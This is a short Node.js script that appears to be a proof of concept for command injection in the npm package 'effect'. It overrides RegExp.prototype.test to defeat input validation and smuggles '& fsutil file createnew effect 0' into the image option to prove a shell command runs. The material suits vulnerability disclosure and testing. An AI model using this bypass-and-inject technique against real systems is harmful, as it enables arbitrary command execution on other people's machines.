RegExp.prototype.test = () => false;
const Root = require('effect');
const fs = require('fs');
const path = './effect';
var options = { image: '& fsutil file createnew effect 0' };
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
Root.edge(options, () => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    try {
        fs.unlinkSync('-colorspace');
        fs.unlinkSync('-edge');
        fs.unlinkSync('-negate');
        fs.unlinkSync('-resize');
        fs.unlinkSync('5');
        fs.unlinkSync('100%');
        fs.unlinkSync('Gray');
        fs.unlinkSync(path);
    } catch (err) {
    }
});